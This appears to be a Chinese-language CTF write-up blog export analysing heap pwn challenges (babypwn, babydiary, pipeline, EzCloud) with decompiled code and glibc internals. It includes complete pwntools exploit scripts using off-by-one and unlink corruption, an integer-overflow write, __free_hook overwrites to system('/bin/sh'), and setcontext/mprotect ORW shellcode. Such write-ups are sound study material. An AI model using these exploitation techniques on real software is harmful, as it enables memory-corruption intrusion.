程序使用了沙盒，使用orw读取flag。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111from pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;amd64&#x27;, endian = &#x27;little&#x27;)sh = process(&#x27;./babypwn&#x27;, env= &#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libseccomp.so.2&#x27;&#125;)libc = ELF(&#x27;./libc.so.6&#x27;)def db(): cmd = &#x27;&#x27;&#x27; init-pwndbg bpie 0xE69 bpie 0x10CB bpie 0xD90 bpie 0xF9A &#x27;&#x27;&#x27; gdb.attach(sh, cmd)from z3 import *def solve(target): a1 = BitVec(&#x27;a1&#x27;, 32) x = a1 for _ in range(2): x ^= (32 * x) ^ LShR((x ^ (32 * x)), 17) ^ (((32 * x) ^ x ^ LShR((x ^ (32 * x)), 17)) &lt;&lt; 13) s = Solver() s.add(x == target) assert s.check() == sat return (s.model()[a1].as_long())def add(size): sh.sendlineafter(&#x27;&gt;&gt;&gt;&#x27;, &#x27;1&#x27;) sh.sendlineafter(&#x27;size&#x27;, str(size))def free(idx): sh.sendlineafter(&#x27;&gt;&gt;&gt;&#x27;, &#x27;2&#x27;) sh.sendlineafter(&#x27;index&#x27;, str(idx))def edit(idx, content): sh.sendlineafter(&#x27;&gt;&gt;&gt;&#x27;, &#x27;3&#x27;) sh.sendlineafter(&#x27;index&#x27;, str(idx)) sh.sendafter(&#x27;content&#x27;, content)def show(idx): sh.sendlineafter(&#x27;&gt;&gt;&gt;&#x27;, &#x27;4&#x27;) sh.sendlineafter(&#x27;index&#x27;, str(idx)) sh.recvline() tmp1 = solve(int(sh.recvline(keepends = False), 16)) tmp2 = solve(int(sh.recvline(keepends = False), 16)) return (tmp2 &lt;&lt; 32) + tmp1[add(0x1f0) for i in range(2)][free(i) for i in range(2)][add(0x1f0) for i in range(7)]heapbase = show(0) - 0xcb0print(hex(heapbase))add(0x1f0)add(0x200)add(0x1f0)[free(i) for i in range(7)]free(7)add(0xa0) # 0libc.address = show(0) - 0x3ebe90print(hex(libc.address))add(0x148) # 1addr = heapbase + 0x1ab0edit(1, &#x27;a&#x27; * 0x148)edit(1, &#x27;a&#x27; * 0x140 + p64(0x150 + 0xa0))edit(0, p64(0) + p64(0x1f0) + p64(addr) * 2)edit(8, &#x27;a&#x27; * 0x1f0 + p64(0) + p64(0x211))free(8)free_hook = libc.sym[&#x27;__free_hook&#x27;]setcontext = libc.sym[&#x27;setcontext&#x27;] + 53mprotect = libc.sym[&#x27;mprotect&#x27;]add(0x120) # 2free(1)edit(2, &#x27;a&#x27; * 0xa0 + p64(free_hook))add(0x140) # 1add(0x140) # 3payload = flat(&#123;0x68: free_hook &amp; ~0xfff,0x70: 0x1000,0x88: 7,0xa0: free_hook + 0x18,0xa8: mprotect&#125;)edit(2, payload)orw = asm(&#x27;&#x27;&#x27;mov rax, 2mov rdi, &#123;flag&#125;mov rsi, 0syscallxor rax, raxmov rdi, 3mov rsi, &#123;bss&#125;mov rdx, 0x300syscallmov rax, 1mov rdi, 1mov rsi, &#123;bss&#125;mov rdx, 0x100syscall &#x27;&#x27;&#x27;.format(flag = free_hook + 0x8, bss = free_hook + 0x200))edit(3, p64(setcontext) + &#x27;./flag\\x00\\x00&#x27; + p64(0) + p64(free_hook + 0x20) + orw)free(2)sh.interactive() 注意点 这里由于free函数向后合并的时候需要检测nextinuse，所以伪造的下下个chunk的inuse位一定要为1，否则会进入unlink函数，并报错corrupted size vs. prev_size。 这里对应的是第69行的p64(0x211)。 123456 4302 /* consolidate forward */ 4303 if (!nextinuse) &#123;► 4304 unlink(av, nextchunk, bck, fwd); 4305 size += nextsize; 4306 &#125; else 4307 clear_inuse_bit_at_offset(nextchunk, 0); 使用unlink函数的时候，如果单纯想要制造堆块重叠，其实只需要将fd和bk设置为伪堆块的头部指针即可 ，这样*(FD -&gt; bk)= p和*(BK -&gt; fd)= p两个条件都满足。 在setcontext的过程中，我们要赋给esp的运行地址，且要压入mprotect的函数地址，如果需要在前面加上./flag\\x00\\x00字符串的话，需要空8个字节，否则字符串就会被mprotect的函数地址覆盖了。 setcontext我们已经遇到好几次了，发现不同师傅有不同的写法，实际上还可以这么写： 123456789sig = SigreturnFrame()sig.rsp = free_hook + 0x18# sig.rbp = sig.rspsig.rip = mprotectsig.rdi = free_hook &amp; ~0xfffsig.rsi = 0x1000sig.rdx = 7# sig.csgsfs = 0x2b000000000033edit(2, str(sig)) 使用gdb进行attach的函数真挺好用的： 123456789def db(): cmd = &#x27;&#x27;&#x27; init-pwndbg bpie 0xE69 bpie 0x10CB bpie 0xD90 bpie 0xF9A &#x27;&#x27;&#x27; gdb.attach(sh, cmd) babydiary 使用IDA反编译程序： 发现初始化函数可能存在花指令，将1268地址的数据修改为nop，再进行反编译，就可以看到初始化函数： 1234567891011121314unsigned int sub_1269()&#123; int i; // [rsp+Ch] [rbp-4h] setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); for ( i = 0; i &lt;= 24; ++i ) &#123; qword_4060[i] = 0LL; dword_4140[i] = 0; &#125; return alarm(0x78u);&#125; main函数： 123456789101112131415161718192021222324252627282930int sub_18BD()&#123; int result; // eax while ( 1 ) &#123; sub_1416(); result = sub_13C3(); if ( result == 4 ) return result; if ( result &gt; 4 ) goto LABEL_10; switch ( result ) &#123; case 3: sub_1814(); break; case 1: sub_169D(); break; case 2: sub_17A8(); break; default:LABEL_10: printf(&quot;wrong choice&quot;); break; &#125; &#125;&#125; add函数： 123456789101112131415161718192021void sub_169D()&#123; int i; // [rsp+4h] [rbp-Ch] int v1; // [rsp+8h] [rbp-8h] unsigned int v2; // [rsp+Ch] [rbp-4h] for ( i = 0; i &lt;= 24 &amp;&amp; qword_4060[i]; ++i ) ; if ( i &lt;= 24 ) &#123; printf(&quot;size: &quot;); v1 = sub_13C3(); qword_4060[i] = malloc(v1 + 1); // qword_4060存放地址 if ( qword_4060[i] ) &#123; printf(&quot;content: &quot;); v2 = sub_132B(qword_4060[i], v1, 10); // myread函数 sub_1528((unsigned int)i, v2); // 关键函数，这里传入了写入的字符个数v2 &#125; &#125;&#125; 跟进myread函数： 1234567891011121314151617__int64 __fastcall sub_132B(__int64 a1, int a2, char a3)&#123; unsigned int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; (int)i &lt; a2; ++i ) &#123; if ( (int)read(0, (void *)((int)i + a1), 1uLL) &lt;= 0 ) &#123; puts(&quot;read error&quot;); exit(0); &#125; if ( a3 == *(_BYTE *)((int)i + a1) ) // 换行符 break; &#125; *(_BYTE *)((int)i + a1) = 0; // 多写一位，但是由于前面malloc的参数已经加1，所以这里没有溢出 return i;&#125; 跟进sub_1528关键函数，发现函数往输入的末位写入一位类似校验位的数据，这就造成了off by one漏洞，如果我们能够控制好输入的内容，就可以任意溢出一个字节，修改后一个chunk的size位： 123456789101112void __fastcall sub_1528(unsigned int a1, int a2)&#123; __int64 v2; // [rsp+10h] [rbp-8h] if ( a1 &lt;= 0x18 &amp;&amp; qword_4060[a1] ) &#123; v2 = qword_4060[a1]; dword_4140[a1] = a2; // dword_4140存放写入数量 if ( a2 ) *(_BYTE *)(a2 + 1LL + v2) = (*(_BYTE *)(a2 + 1LL + v2) &amp; 0xF0) + sub_146E(a1); &#125; // 末位的后一位进行重新赋值，off by one&#125; 跟进sub_146E函数： 1234567891011121314__int64 __fastcall sub_146E(unsigned int a1)&#123; int i; // [rsp+10h] [rbp-14h] unsigned int v3; // [rsp+14h] [rbp-10h] if ( a1 &gt; 0x18 || !qword_4060[a1] ) return 0xFFFFFFFFLL; v3 = 0; for ( i = 0; i &lt; dword_4140[a1]; ++i ) v3 += *(unsigned __int8 *)(i + qword_4060[a1]); // 取出堆块内容中的每一个int8 while ( v3 &gt; 0xF ) // 如果v3大于0xf v3 = (v3 &gt;&gt; 4) + (v3 &amp; 0xF); // 求出除以16的商和余数，求和 return v3;&#125; show函数： 123456789101112int sub_17A8()&#123; int result; // eax unsigned int v1; // [rsp+Ch] [rbp-4h] printf(&quot;index: &quot;); v1 = sub_13C3(); result = sub_15DF(v1) ^ 1; if ( !(_BYTE)result ) return printf(&quot;content: %s\\n&quot;, (const char *)qword_4060[v1]); return result;&#125; 跟进sub_15DF检测函数，该函数检测v2与计算出来的位之和共奇偶，就可以打印： 12345678910111213_BOOL8 __fastcall sub_15DF(signed int a1)&#123; char v2; // bl int v3; // [rsp+Ch] [rbp-14h] if ( a1 &gt; 24 || !qword_4060[a1] ) return 0LL; v3 = dword_4140[a1]; // 注意新建堆时必须要填入内容，否则检测函数会判断错误，并返回0 if ( !v3 ) return 0LL; v2 = *(_BYTE *)(v3 + 1LL + qword_4060[a1]); return ((v2 - (unsigned __int8)sub_146E(a1)) &amp; 1) == 0;&#125; free函数： 123456789101112131415161718192021int sub_1814()&#123; _DWORD *v0; // rax int v2; // [rsp+Ch] [rbp-4h] printf(&quot;index: &quot;); LODWORD(v0) = sub_13C3(); v2 = (int)v0; if ( (int)v0 &lt;= 24 ) &#123; v0 = (_DWORD *)qword_4060[(int)v0]; if ( v0 ) &#123; free((void *)qword_4060[v2]); qword_4060[v2] = 0LL; v0 = dword_4140; dword_4140[v2] = 0; // 并未清空堆空间内容 &#125; &#125; return (int)v0;&#125; 思路，存在off by one漏洞时，我们可以使用unlink函数进行攻击，下面看看如何绕过： 构造释放堆块前一个chunk的header 首先通过large bin残存的fd_nextsize和bk_nextsize来构造unlink的fd和bk指针。 申请一个large bin大小的chunk，首先释放成为unsorted bin，然后申请一个更大的chunk，这样unsorted bin就会进入large bin中，这时他的fd_nextsize和bk_nextsize指针指向的都是自己。 1234567891011121314# 释放后成为unsorted binpwndbg&gt; x/20gx 0x56171f2c93e00x56171f2ca010: 0x0000000000000000 0x00000000000013d10x56171f2ca020: 0x00007fcb749bdbe0 0x00007fcb749bdbe00x56171f2ca030: 0x0000000000000000 0x0000000000000000# 申请更大的chunk后，或者申请分割的chunk，堆块会先进入large bin，写入fd_nextsize和bk_nextsize两个指针，并同时指向堆块头部。# 进入large bin后被分割，仍会回到unsorted binpwndbg&gt; x/20gx 0x56171f2ca0100x56171f2ca010: 0x0000000000000000 0x00000000000000310x56171f2ca020: 0x0000000000000007 0x00000000000001010x56171f2ca030: 0x000056171f220008 0x000056171f2ca0100x56171f2ca040: 0x0000000000000000 0x00000000000013b10x56171f2ca050: 0x00007fcb749bdbe0 0x00007fcb749bdbe0 这时候修改fd指针为fd-8，不修改bk指针，这样FD -&gt; bk和BK -&gt; fd同时指向了0x56171f2ca020，并且需要在该地址存储自己的地址0x56171f2ca020，从而绕过unlink的检测。 这里要注意写入操作中会将地址的倒数第2个字节覆盖为\\x00，所以我们要保证上述的几个地址，包括0x56171f2ca020 - 0x18的倒数第2个字节的低位仍然为\\x0。 如何构造上述地址呢？我们构造两个fast bin，接连将其释放，这样0x56171f2ca020位置就会写入fd的指针，即前一个fast bin的地址，通过修改fast bin的指针来达成目的。 由于地址末位为0x20，所以只需要写入p8(0x20)即可，但是根据写入的规则，程序会将地址倒数第2个字节覆盖为\\x00，倒数第3个字节的低位覆盖为checksum校验位\\x2： 1234pwndbg&gt; x/20gx 0x56171f2ca0100x56171f2ca010: 0x0000000000000000 0x00000000000000310x56171f2ca020: 0x000056171f220020 0x00000000000001010x56171f2ca030: 0x000056171f220008 0x000056171f2ca010 由于上面写入fd的时候也会在倒数第二位覆盖为\\x00，倒数第3个字节的低位覆盖为checksum校验位，那么我们需要保证两个写入checksum的是相同的（这里都为\\x2）。这里通过修改上面的payload中add(0x20, p64(0x7) + p64(0x101) + p8(0x08)) # 9的无用数据p64(0x7)进行调整。 实际上除了倒数3位是相同的外，其余参数由于系统开启了PIE都是随机的，所以0x000056171f220020加粗的部分是需要爆破的，有1/256的可能性可以命中。 构造释放堆块的prev size和prev inuse位 首先通过内容全部写\\x00，将prev_inuse位覆盖为\\x0。 然后使用add(0x17, p64(0) + p64(1)) # 12将prev_size位覆盖为0x100，还是比较巧妙的。但导致prev_size只能写入0x100的倍数，所以我们前面的fackchunk的size位也要写成0x101。 注意要保证free这个chunk的时候会触发malloc_consolidate函数，所以要确保chunk大小在tcache范围之外，这里选择了0x500。 1234pwndbg&gt; x/20gx 0x55932b25c1200x55932b25c120: 0x0000000000000100 0x00000000000005100x55932b25c130: 0x00007f2d9b870061 0x00007f2d9b8a12100x55932b25c140: 0x000055932b25c120 0x000055932b25c120 构造释放堆块下个chunk的prev_inuse位 这里很简单，只需要申请一个chunk即可，为了后面的堆块重叠，我们选择将后面的free chunk全部申请掉。 脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788from pwn import *context(endian = &#x27;little&#x27;, arch = &#x27;amd64&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)def db(): cmd = &#x27;&#x27;&#x27; init-pwndbg b malloc b free &#x27;&#x27;&#x27; gdb.attach(sh, cmd)def choice(cho): sh.sendlineafter(&#x27;&gt;&gt; &#x27;, str(cho))def add(size, content = &#x27;a&#x27;): choice(1) sh.sendlineafter(&#x27;size: &#x27;, str(size)) sh.sendlineafter(&#x27;content: &#x27;, content) v3 = 0 &#x27;&#x27;&#x27; for char in content: v3 += ord(char) while v3 &gt; 0xf: v3 = (v3 / 0x10) + (v3 % 0x10) print(content, hex(v3) &#x27;&#x27;&#x27;def show(idx): choice(2) sh.sendlineafter(&#x27;index: &#x27;, str(idx))def free(idx): choice(3) sh.sendlineafter(&#x27;index: &#x27;, str(idx))def pwn(): [add(0x20) for i in range(7)] # 0-6 add(0x2000) # 7 add(0x10) # 8 free(7) add(0x1000 - 0x3f0 + 0x10) # 7 add(0x20, p64(0x7) + p64(0x101) + p8(0x08)) # 9 add(0x20) # 10 [free(i) for i in range(7)] free(10) free(9) [add(0x20) for i in range(7)] # 0-6 add(0x20, p8(0x20)) # 9 add(0x100 - 0x30 * 2 - 0x20) # 10 add(0x17) # 11 free(11) add(0x500) # 11 add(0x17, p64(0) * 2 + p32(0) + p8(0) * 3) # 12 free(12) add(0x17, p64(0) + p64(1)) # 12 add(0xdb0) # 13 free(11) add(0x40) # 11 show(10) sh.recvuntil(&quot;content: &quot;) libc.address = u64(sh.recvuntil(&#x27;\\x7f&#x27;, timeout = 0.5).ljust(8, &#x27;\\x00&#x27;)) - 0x60 - 0x1ebb80 assert libc.address &amp; 0xfff == 0 print(hex(libc.address)) add(0x10) # 14 free(14) free(12) add(0x100, flat(&#123;0x68: 0x21, 0x70: libc.sym[&#x27;__free_hook&#x27;] - 8&#125;, filler = &#x27;\\x00&#x27;)) # 12 add(0x10) # 14 add(0x10, &#x27;/bin/sh\\x00&#x27; + p64(libc.sym[&#x27;system&#x27;])) # 15 free(15) sh.interactive()while True: sh = process(&quot;./baby_diary&quot;) try: pwn() except KeyboardInterrupt: break except: sh.close() pipeline 使用IDA反编译程序： 123456__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; ((void (__fastcall *)(__int64, char **, char **))((char *)&amp;sub_1288 + 1))(a1, a2, a3); sub_1921(); return 0LL;&#125; 跟进函数： 1234567891011121314void sub_1921()&#123; unsigned int v0; // [rsp+Ch] [rbp-4h] while ( 1 ) &#123; sub_14E1(); v0 = sub_1540(&quot;&gt;&gt; &quot;); if ( v0 &lt;= 6 ) break; printf(&quot;wrong choice&quot;); &#125; __asm &#123; jmp rax &#125;&#125; 后面的汇编代码IDA似乎解析得不全，我们来解析一下： 123456789.text:000000000000194C mov eax, [rbp+var_4].text:000000000000194F lea rdx, ds:0[rax*4] # rdx = 4 * rax.text:0000000000001957 lea rax, byte_20BC # 0xfffff8b4fffff8fa.text:000000000000195E mov eax, [rdx+rax] # 0xfffff8fa.text:0000000000001961 cdqe # 0xfffffffffffff8b4.text:0000000000001963 lea rdx, byte_20BC # rdx = $rebase(0x020BC).text:000000000000196A add rax, rdx # rax = $rebase(0x020BC - 0x74C) = $rebase(0x1970).text:000000000000196D db 3Eh.text:000000000000196D jmp rax 原理分析下来，byte_20BC数组类似于函数地址表，最后取得的rax为$rebase(0x1970)后的函数： add函数，发现malloc的结构体是一个链式结构： 1234567891011121314151617181920212223242526272829303132333435unsigned __int64 sub_15B5()&#123; unsigned __int64 result; // rax int v1; // [rsp+Ch] [rbp-14h] __int64 v2; // [rsp+10h] [rbp-10h] void *s; // [rsp+18h] [rbp-8h] s = sub_1391(24); // malloc函数，堆块大小0x18 memset(s, 0, 0x18uLL); if ( qword_4058 ) &#123; v1 = 1; // v1 = idx v2 = qword_4058; // v2 = memsize while ( *(_QWORD *)(v2 + 16) ) &#123; v2 = *(_QWORD *)(v2 + 16); ++v1; &#125; if ( v1 &lt;= 9 ) &#123; result = v2; *(_QWORD *)(v2 + 16) = s; // 在0x10的位置上填入下一个buff的地址，证明这是一个链式结构 &#125; else &#123; return sub_1422((unsigned __int64)s); // checkerr函数 &#125; &#125; else &#123; result = (unsigned __int64)s; qword_4058 = (__int64)s; &#125; return result;&#125; 新增结构体pipe： 1234567struct pipe&#123; char *malloc_addr; int offset; int size; struct pipe *next_ptr;&#125;; 映射v2为pipe结构体，去掉类型转换后，代码就清晰很多了： 1234567891011121314151617181920212223242526272829303132333435struct pipe *sub_15B5()&#123; struct pipe *result; // rax int v1; // [rsp+Ch] [rbp-14h] struct pipe *v2; // [rsp+10h] [rbp-10h] void *s; // [rsp+18h] [rbp-8h] s = sub_1391(24); memset(s, 0, 0x18uLL); if ( qword_4058 ) // 首次qword_4058为空，第一次运行后会进行赋值 &#123; v1 = 1; v2 = qword_4058; while ( v2-&gt;next_ptr ) &#123; v2 = v2-&gt;next_ptr; ++v1; &#125; if ( v1 &lt;= 9 ) &#123; result = v2; v2-&gt;next_ptr = s; &#125; else &#123; return sub_1422(s); &#125; &#125; else &#123; result = s; qword_4058 = s; &#125; return result;&#125; edit函数，实际上虽然叫edit函数，确是新建另一个堆的过程： 1234567891011121314151617181920212223242526272829303132struct pipe *sub_16B5()&#123; struct pipe *result; // rax int v1; // [rsp+4h] [rbp-Ch] struct pipe *v2; // [rsp+8h] [rbp-8h] v1 = sub_1540(&quot;index: &quot;); result = sub_1651(v1); v2 = result; if ( result ) &#123; result-&gt;offset = sub_1540(&quot;offset: &quot;); v2-&gt;size = sub_1540(&quot;size: &quot;); v2-&gt;malloc_addr = sub_13CA(v2-&gt;malloc_addr, v2-&gt;size); // realloc if ( v2-&gt;malloc_addr ) // 存储再v2结构体的头8位字节 &#123; if ( v2-&gt;offset &gt;= v2-&gt;size || (result = v2-&gt;offset, result &lt; 0) ) &#123; result = v2; v2-&gt;offset = 0; &#125; &#125; else &#123; v2-&gt;size = 0; v2-&gt;malloc_addr = 0LL; result = v2; v2-&gt;offset = 0; &#125; &#125; return result;&#125; 这里我们来复习一下realloc函数： void *realloc (void *ptr, size_t new_size ); realloc函数用于修改一个原先已经分配的内存块的大小，可以使一块内存的扩大或缩小。当起始空间的地址为空，即*ptr = NULL,则同malloc。当*ptr非空：若nuw_size &lt; size,即缩小*ptr所指向的内存空间，该内存块尾部的部分内存被拿掉，剩余部分内存的原先内容依然保留；若nuw_size &gt; size,即扩大*ptr所指向的内存空间，如果原先的内存尾部有足够的扩大空间，则直接在原先的内存块尾部新增内存，如果原先的内存尾部空间不足，或原先的内存块无法改变大小，realloc将重新分配另一块new_size大小的内存，并把原先那块内存的内容复制到新的内存块上。因此，使用realloc后就应该改用realloc返回的新指针。 实际上这里的堆块结构如下图： 123450x56134a4822b0: 0x0000000000000000 0x00000000000000210x56134a4822c0: 0x0000000000000000 0x0000000000000000 malloc_addr, size offset0x56134a4822d0: 0x000056134a4822e0 0x0000000000000021 next_ptr0x56134a4822e0: 0x0000000000000000 0x00000000000000000x56134a4822f0: 0x000056134a482300 0x0000000000000021 也就是说，当我们add函数申请chunk时，malloc_addr和size、offset是不初始化的。而他们的初始化是在edit函数进行的。后面的append和show函数是对malloc_addr上存储的堆进行操作的，destory函数则是对链式结构堆进行操作的。 回过头来看到初始化函数： 12345678910unsigned int sub_1288()&#123; setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); qword_4050 = (__int64)malloc(0x10uLL); // 第一个申请的堆块地址 *(_QWORD *)qword_4050 = qword_4050 + 16; // 堆中前8位字符存放着qword_4050 + 16 *(_QWORD *)(qword_4050 + 8) = 0x21000LL; // 后8位字符存放着整个内存的大小0x21000 return alarm(0x78u);&#125; checkerr函数，需要保证申请的堆块不能超出初始化的第一个堆块地址到0x21000的范围： 1234567891011unsigned __int64 __fastcall sub_1332(unsigned __int64 a1)&#123; unsigned __int64 result; // rax if ( a1 &lt; *(_QWORD *)qword_4050 || (result = *(_QWORD *)qword_4050 + *(_QWORD *)(qword_4050 + 8), a1 &gt;= result) ) &#123; puts(&quot;error&quot;); exit(0); &#125; return result;&#125; destory函数，只是一个脱链操作，并没有真正的free掉： 1234567891011121314151617181920struct pipe *__fastcall sub_178A(__int64 a1, int a2)&#123; struct pipe *result; // rax unsigned int v3; // [rsp+Ch] [rbp-14h] struct pipe *v4; // [rsp+10h] [rbp-10h] v3 = sub_1540(&quot;index: &quot;); result = sub_1651(v3, a2); // 取第v3个堆块的指针函数，但是要保证链不能断 v4 = result; if ( result ) &#123; if ( result == qword_4058 ) qword_4058 = result-&gt;next_ptr; else sub_1651((v3 - 1), a2)-&gt;next_ptr = result-&gt;next_ptr; // 将next_ptr指针赋值给前一个 sub_1422(v4-&gt;malloc_addr); return sub_1422(v4); &#125; return result;&#125; append函数，这里存在整型溢出，如果v5取一个负数，那么就可以绕过验证，这样就可以扩大v3的值，实现数组溢出： 1234567891011121314151617181920212223242526struct pipe *__fastcall sub_1819(__int64 a1, int a2)&#123; struct pipe *result; // rax int v3; // eax unsigned int v4; // [rsp+10h] [rbp-10h] int v5; // [rsp+14h] [rbp-Ch] struct pipe *v6; // [rsp+18h] [rbp-8h] v4 = sub_1540(&quot;index: &quot;); result = sub_1651(v4, a2); v6 = result; if ( result ) &#123; result = result-&gt;malloc_addr; if ( v6-&gt;malloc_addr ) &#123; v5 = sub_1540(&quot;size: &quot;); printf(&quot;data: &quot;); v3 = v6-&gt;size - v6-&gt;offset; if ( v5 &lt;= v3 ) // 如果要输入的大小小于size - offset，存在整型溢出 LOWORD(v3) = v5; // loword取出低16位 return sub_1453(&amp;v6-&gt;malloc_addr[v6-&gt;offset], v3); // 从offset处继续开始写 &#125; &#125; return result;&#125; show函数： 1234567891011121314151617int __fastcall sub_18B9(__int64 a1, int a2)&#123; struct pipe *v2; // rax unsigned int v4; // [rsp+4h] [rbp-Ch] struct pipe *v5; // [rsp+8h] [rbp-8h] v4 = sub_1540(&quot;index: &quot;); v2 = sub_1651(v4, a2); v5 = v2; if ( v2 ) &#123; v2 = v2-&gt;malloc_addr; if ( v5-&gt;malloc_addr ) LODWORD(v2) = printf(&quot;data: %s\\n&quot;, &amp;v5-&gt;malloc_addr[v5-&gt;offset]); &#125; return v2;&#125; 思路： 由于没有free函数，我们需要使用realloc(0)替代。 先使用edit函数申请一个0x400以上的堆块，free成为unsorted bin后，再申请回来，从而泄露libc地址。 输入一个负数实现数组溢出，这里输入的是-0x7fffff00，在计算机中表示为0x7fffff00的补码，即0x8000100，绕过检测后取低16位，即赋值v3为0x100，可以读入0x100个字符。 数组溢出后可以改写下一个链式结构，包括其malloc_addr地址，最后实现任意地址写，将__free_hook地址改写为system函数地址。 脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;amd64&#x27;, endian = &#x27;little&#x27;)sh = process(&#x27;./pipeline&#x27;)elf = ELF(&#x27;./pipeline&#x27;)libc = elf.libcdef db(): cmd = &#x27;&#x27;&#x27; init-pwndbg &#x27;&#x27;&#x27; gdb.attach(sh, cmd)def choice(cho): sh.sendlineafter(&#x27;&gt;&gt; &#x27;, str(cho))def add(): choice(1)def edit(idx, offset, size): choice(2) sh.sendlineafter(&#x27;index: &#x27;, str(idx)) sh.sendlineafter(&#x27;offset: &#x27;, str(offset)) sh.sendlineafter(&#x27;size: &#x27;, str(size))def destory(idx): choice(3) sh.sendlineafter(&#x27;index: &#x27;, str(idx))def append(idx, size, data): choice(4) sh.sendlineafter(&#x27;index: &#x27;, str(idx)) sh.sendlineafter(&#x27;size: &#x27;, str(size)) sh.sendafter(&#x27;data: &#x27;, data)def show(idx): choice(5) sh.sendlineafter(&#x27;index: &#x27;, str(idx))add() # 0edit(0, 0, 0x1000)add() # 1 防止合并到top chunkedit(0, 0, 0)edit(0, 0, 0x1000) show(0)sh.recvuntil(&#x27;data: &#x27;)libc.address = u64(sh.recvline()[:-1].ljust(8, &#x27;\\x00&#x27;)) - 0x1ebbe0print(hex(libc.address))add() # 2edit(2, 0xff, 0x100)add() # 3edit(3, 0, 0x100)add() # 4edit(4, 0, 0x100)append(4, 0x40, &#x27;/bin/sh\\n&#x27;)append(2, -0x7fffff00, flat([&#x27;a&#x27;, 0, 0x21, libc.sym[&#x27;__free_hook&#x27;], &#x27;\\n&#x27;]))append(3, 0x30, flat([libc.sym[&#x27;system&#x27;], &#x27;\\n&#x27;]))edit(4, 0, 0)sh.interactive() EzCloud 这是一道虚拟化方向的题目，参考链接：https://matshao.com/2021/06/15/QWB2021-Quals-EzCloud/ 12345678910111213141516171819202122232425262728293031323334353637383940414243__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; int fd; // [rsp+0h] [rbp-60h] int v5; // [rsp+4h] [rbp-5Ch] unsigned __int64 v6; // [rsp+8h] [rbp-58h] __int64 buf[10]; // [rsp+10h] [rbp-50h] BYREF buf[9] = __readfsqword(0x28u); sub_1463(a1, a2, a3); alarm(0x168u); setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); fd = open(&quot;/dev/urandom&quot;, 0); if ( fd &gt;= 0 ) &#123; memset(buf, 0, 64); sub_9292(&amp;s2, 64LL, buf); v6 = 0LL; while ( v6 &lt;= 0x3F ) &#123; read(fd, buf, 1uLL); if ( ((*__ctype_b_loc())[SLOBYTE(buf[0])] &amp; 0x1000) != 0 ) *((_BYTE *)s2 + v6++) = buf[0]; &#125; close(fd); ::fd = open(&quot;/dev/NULL&quot;, 1); v5 = fcntl(0, 3, 0LL); if ( v5 &lt; 0 ) &#123; printf(&quot;F_GETFL error&quot;); exit(0); &#125; if ( fcntl(0, 4, v5 | 0x800u) &lt; 0 ) &#123; printf(&quot;F_SETFL error&quot;); exit(0); &#125; while ( 1 ) sub_8BB9(); &#125; return 0xFFFFFFFFLL;&#125;","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"Hello World","slug":"hello-world","date":"2021-10-08T16:34:51.073Z","updated":"1985-10-26T08:15:00.000Z","comments":true,"path":"2021/10/09/hello-world/","link":"","permalink":"http://example.com/2021/10/09/hello-world/","excerpt":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]}